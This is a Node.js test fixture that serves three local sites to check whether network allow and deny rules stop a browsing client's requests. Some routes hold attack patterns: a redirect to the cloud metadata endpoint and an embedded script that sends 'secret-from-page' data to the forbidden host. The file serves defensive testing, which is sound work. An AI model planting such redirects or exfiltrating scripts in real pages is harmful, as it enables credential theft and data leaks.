// The T94 live test sites, each logging every request it receives to sites-log.txt (the proof
// that a refused request was never sent). Three hosts, all local:
//   127.0.0.1:18871  "allowed" site (a network allow rule covers 127.0.0.1)
//   localhost:18872  "unlisted" site (no rule)
//   127.0.0.2:18873  "forbidden" site (a network deny rule covers 127.0.0.2)
import { appendFileSync, writeFileSync } from "node:fs";
import http from "node:http";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const logFile = join(here, "sites-log.txt");
writeFileSync(logFile, "");
// Allowed site: http://127.0.0.1:18871 (served below by port).
const UNLISTED = "http://localhost:18872";
const FORBIDDEN = "http://127.0.0.2:18873";

function page(title, body) {
  return `<!doctype html><html><head><title>${title}</title></head><body><h1>${title}</h1>${body}</body></html>`;
}

function site(name, host, port) {
  const server = http.createServer((req, res) => {
    const line = `${new Date().toISOString()} ${name} ${req.method} ${req.url}`;
    appendFileSync(logFile, `${line}\n`);
    const html = (title, body) => {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end(page(title, body));
    };
    switch (req.url) {
      case "/redirect-to-unlisted":
        res.writeHead(302, { location: `${UNLISTED}/landed` });
        return res.end();
      case "/redirect-to-admin":
        res.writeHead(302, { location: "/admin/panel" });
        return res.end();
      case "/redirect-to-metadata":
        res.writeHead(302, { location: "http://169.254.169.254/latest/meta-data/" });
        return res.end();
      case "/redirect-ok":
        res.writeHead(302, { location: "/docs" });
        return res.end();
      case "/links":
        return html(
          "Links",
          `<p><a id="unlisted" href="${UNLISTED}/clicked">to the unlisted site</a></p>` +
            `<p><a id="forbidden" href="${FORBIDDEN}/clicked">to the forbidden site</a></p>` +
            `<p><a id="same" href="/docs">to docs on this site</a></p>`,
        );
      case "/scripts":
        return html(
          "Scripts",
          `<img src="${FORBIDDEN}/pixel.png"><img src="${UNLISTED}/cdn.png">` +
            `<script>fetch('${FORBIDDEN}/collect?data=secret-from-page').catch(()=>{});` +
            `fetch('${UNLISTED}/api').catch(()=>{});</script>`,
        );
      default:
        return html(`${name} ${req.url}`, `<p>This is ${name}${req.url}.</p>`);
    }
  });
  server.listen(port, host, () => console.log(`${name} on http://${host}:${port}`));
}

site("allowed", "127.0.0.1", 18871);
// Dual-stack: "localhost" may resolve to ::1 first.
site("unlisted", "::", 18872);
site("forbidden", "127.0.0.2", 18873);
